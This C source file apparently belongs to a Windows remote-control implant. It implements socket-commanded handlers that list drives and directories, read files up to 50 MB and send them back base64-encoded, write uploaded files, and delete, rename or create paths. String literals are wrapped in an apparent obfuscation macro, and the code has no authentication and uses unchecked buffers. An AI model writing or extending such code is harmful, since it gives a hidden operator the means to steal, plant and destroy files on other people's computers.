#include "filebrowser.h"
#include <stdio.h>
#include <io.h>
#include <direct.h>
#include <sys/stat.h>
#include "cJSON.h"

#define MAX_DOWNLOAD_BYTES (50 * 1024 * 1024)

static void fb_error(SOCKET sock, HANDLE mutex, const char* prefix, const char* msg) {
    cJSON* root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "error", msg);
    char* json_str = cJSON_PrintUnformatted(root);
    char* buf = malloc(strlen(json_str) + strlen(prefix) + 1);
    sprintf(buf, "%s%s", prefix, json_str);
    sock_send(sock, mutex, buf);
    free(buf);
    free(json_str);
    cJSON_Delete(root);
}

void handle_ls(SOCKET sock, HANDLE mutex, const char* path) {
    if (strlen(path) == 0) {
        cJSON* root = cJSON_CreateObject();
        cJSON_AddStringToObject(root, _S("path"), "");
        cJSON_AddStringToObject(root, _S("sep"), _S("\\"));
        cJSON* items = cJSON_CreateArray();
        DWORD drives = GetLogicalDrives();
        for (int i = 0; i < 26; i++) {
            if (drives & (1 << i)) {
                char d[5];
                sprintf(d, _S("%c:\\"), 'A' + i);
                cJSON* item = cJSON_CreateObject();
                cJSON_AddStringToObject(item, _S("name"), d);
                cJSON_AddStringToObject(item, _S("type"), _S("drive"));
                cJSON_AddNumberToObject(item, _S("size"), 0);
                cJSON_AddStringToObject(item, _S("mtime"), "");
                cJSON_AddItemToArray(items, item);
            }
        }
        cJSON_AddItemToObject(root, _S("items"), items);
        char* json_str = cJSON_PrintUnformatted(root);
        char* buf = malloc(strlen(json_str) + 32);
        sprintf(buf, _S("[ls_result]%s"), json_str);
        sock_send(sock, mutex, buf);
        free(buf); free(json_str); cJSON_Delete(root);
        return;
    }

    char search_path[MAX_PATH];
    sprintf(search_path, _S("%s\\*"), path);

    WIN32_FIND_DATAA ffd;
    HANDLE hFind = FindFirstFileA(search_path, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) {
        fb_error(sock, mutex, _S("[ls_result]"), _S("Directory not found or access denied"));
        return;
    }

    cJSON* root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, _S("path"), path);
    cJSON_AddStringToObject(root, _S("sep"), _S("\\"));
    cJSON* items = cJSON_CreateArray();

    do {
        if (strcmp(ffd.cFileName, ".") == 0 || strcmp(ffd.cFileName, "..") == 0) continue;

        cJSON* item = cJSON_CreateObject();
        cJSON_AddStringToObject(item, _S("name"), ffd.cFileName);
        int is_dir = (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY);
        cJSON_AddStringToObject(item, _S("type"), is_dir ? _S("dir") : _S("file"));
        cJSON_AddBoolToObject(item, _S("link"), 0);

        unsigned long long size = ((unsigned long long)ffd.nFileSizeHigh << 32) | ffd.nFileSizeLow;
        cJSON_AddNumberToObject(item, _S("size"), is_dir ? 0 : (double)size);

        FILETIME ft = ffd.ftLastWriteTime;
        SYSTEMTIME st;
        FileTimeToSystemTime(&ft, &st);
        char mtime[32];
        sprintf(mtime, _S("%02d.%02d.%d %02d:%02d"), st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute);
        cJSON_AddStringToObject(item, _S("mtime"), mtime);

        if (!is_dir) {
            char* dot = strrchr(ffd.cFileName, '.');
            cJSON_AddStringToObject(item, _S("ext"), dot ? dot : "");
        } else {
            cJSON_AddStringToObject(item, _S("ext"), "");
        }

        cJSON_AddItemToArray(items, item);
    } while (FindNextFileA(hFind, &ffd));

    FindClose(hFind);
    cJSON_AddItemToObject(root, "items", items);
    char* json_str = cJSON_PrintUnformatted(root);
    char* buf = malloc(strlen(json_str) + 32);
    sprintf(buf, "[ls_result]%s", json_str);
    sock_send(sock, mutex, buf);
    free(buf); free(json_str); cJSON_Delete(root);
}

void handle_download(SOCKET sock, HANDLE mutex, const char* path) {
    FILE* f = fopen(path, _S("rb"));
    if (!f) {
        fb_error(sock, mutex, _S("[download_result]"), _S("File not found or access denied"));
        return;
    }
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (size > MAX_DOWNLOAD_BYTES) {
        fclose(f);
        char buf[128];
        sprintf(buf, _S("File too large (%ld MB > 50 MB)"), size / 1024 / 1024);
        fb_error(sock, mutex, _S("[download_result]"), buf);
        return;
    }

    unsigned char* data = malloc(size);
    fread(data, 1, size, f);
    fclose(f);

    size_t b64_len;
    char* b64 = base64_encode(data, size, &b64_len);
    free(data);

    char* name = strrchr(path, '\\');
    if (name) name++; else name = (char*)path;

    cJSON* root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, _S("name"), name);
    cJSON_AddStringToObject(root, _S("data"), b64);
    cJSON_AddNumberToObject(root, _S("size"), (double)size);

    char* json_str = cJSON_PrintUnformatted(root);
    char* buf = malloc(strlen(json_str) + 32);
    sprintf(buf, _S("[download_result]%s"), json_str);
    sock_send(sock, mutex, buf);

    free(buf); free(json_str); free(b64); cJSON_Delete(root);
}

void handle_delete(SOCKET sock, HANDLE mutex, const char* path) {
    DWORD attr = GetFileAttributesA(path);
    int ok = 0;
    if (attr != INVALID_FILE_ATTRIBUTES) {
        if (attr & FILE_ATTRIBUTE_DIRECTORY) {
            // SHFileOperation could be used for recursive delete, but for simplicity:
            ok = RemoveDirectoryA(path);
        } else {
            ok = DeleteFileA(path);
        }
    }

    cJSON* root = cJSON_CreateObject();
    if (ok) {
        cJSON_AddBoolToObject(root, _S("ok"), 1);
        cJSON_AddStringToObject(root, _S("path"), path);
    } else {
        cJSON_AddStringToObject(root, _S("error"), _S("Delete failed"));
    }
    char* json_str = cJSON_PrintUnformatted(root);
    char* buf = malloc(strlen(json_str) + 32);
    sprintf(buf, _S("[delete_result]%s"), json_str);
    sock_send(sock, mutex, buf);
    free(buf); free(json_str); cJSON_Delete(root);
}

void handle_mkdir(SOCKET sock, HANDLE mutex, const char* path) {
    int ok = _mkdir(path) == 0;
    cJSON* root = cJSON_CreateObject();
    if (ok) {
        cJSON_AddBoolToObject(root, _S("ok"), 1);
        cJSON_AddStringToObject(root, _S("path"), path);
    } else {
        cJSON_AddStringToObject(root, _S("error"), _S("mkdir failed"));
    }
    char* json_str = cJSON_PrintUnformatted(root);
    char* buf = malloc(strlen(json_str) + 32);
    sprintf(buf, _S("[mkdir_result]%s"), json_str);
    sock_send(sock, mutex, buf);
    free(buf); free(json_str); cJSON_Delete(root);
}

void handle_upload(SOCKET sock, HANDLE mutex, const char* payload) {
    const char* sep = strchr(payload, '|');
    if (!sep) {
        fb_error(sock, mutex, "[upload_result]", "Invalid payload");
        return;
    }
    int path_len = sep - payload;
    char* path = malloc(path_len + 1);
    strncpy(path, payload, path_len);
    path[path_len] = 0;
    const char* b64 = sep + 1;

    size_t data_len;
    unsigned char* data = base64_decode(b64, strlen(b64), &data_len);
    if (!data) {
        fb_error(sock, mutex, _S("[upload_result]"), _S("Base64 decode error"));
        free(path); return;
    }

    FILE* f = fopen(path, _S("wb"));
    if (!f) {
        fb_error(sock, mutex, _S("[upload_result]"), _S("Cannot open file for writing"));
        free(path); free(data); return;
    }
    fwrite(data, 1, data_len, f);
    fclose(f);

    cJSON* root = cJSON_CreateObject();
    cJSON_AddBoolToObject(root, _S("ok"), 1);
    cJSON_AddStringToObject(root, _S("path"), path);
    cJSON_AddNumberToObject(root, _S("size"), (double)data_len);
    char* json_str = cJSON_PrintUnformatted(root);
    char* buf = malloc(strlen(json_str) + 32);
    sprintf(buf, _S("[upload_result]%s"), json_str);
    sock_send(sock, mutex, buf);
    free(buf); free(json_str); free(path); free(data); cJSON_Delete(root);
}

void handle_rename(SOCKET sock, HANDLE mutex, const char* payload) {
    const char* sep = strchr(payload, '|');
    if (!sep) {
        fb_error(sock, mutex, "[rename_result]", "Invalid payload");
        return;
    }
    int old_len = sep - payload;
    char* old_path = malloc(old_len + 1);
    strncpy(old_path, payload, old_len);
    old_path[old_len] = 0;
    const char* new_path = sep + 1;

    int ok = rename(old_path, new_path) == 0;
    cJSON* root = cJSON_CreateObject();
    if (ok) {
        cJSON_AddBoolToObject(root, _S("ok"), 1);
        cJSON_AddStringToObject(root, _S("old"), old_path);
        cJSON_AddStringToObject(root, _S("new"), new_path);
    } else {
        cJSON_AddStringToObject(root, _S("error"), _S("rename failed"));
    }
    char* json_str = cJSON_PrintUnformatted(root);
    char* buf = malloc(strlen(json_str) + 32);
    sprintf(buf, _S("[rename_result]%s"), json_str);
    sock_send(sock, mutex, buf);
    free(buf); free(json_str); free(old_path); cJSON_Delete(root);
}
